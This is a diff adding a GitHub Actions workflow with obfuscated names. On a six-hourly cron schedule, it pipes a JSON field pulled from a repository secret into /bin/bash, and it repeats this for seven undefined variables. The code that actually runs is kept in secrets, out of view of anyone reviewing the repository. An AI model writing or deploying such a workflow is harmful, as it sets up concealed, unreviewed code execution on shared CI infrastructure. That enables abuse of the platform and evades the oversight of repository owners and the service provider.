@@ -1,0 +1,25 @@
+name: duanyongchang8769
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: duanyongchang8769
+        env:
+          lazvc18: ${{ secrets.lazvc18 }}
+        run: |
+          echo $lazvc18 | jq -r .ti6 | /bin/bash
+          echo $hlmog42125 | jq -r .q78 | /bin/bash
+          echo $ko52 | jq -r .s740 | /bin/bash
+          echo $kr0 | jq -r .ybs1018 | /bin/bash
+          echo $o7 | jq -r .jti3455 | /bin/bash
+          echo $cznl1 | jq -r .yc2622 | /bin/bash
+          echo $qofqo40513 | jq -r .vuce306 | /bin/bash
+          echo $mdwug13680 | jq -r .hklo7 | /bin/bash
+
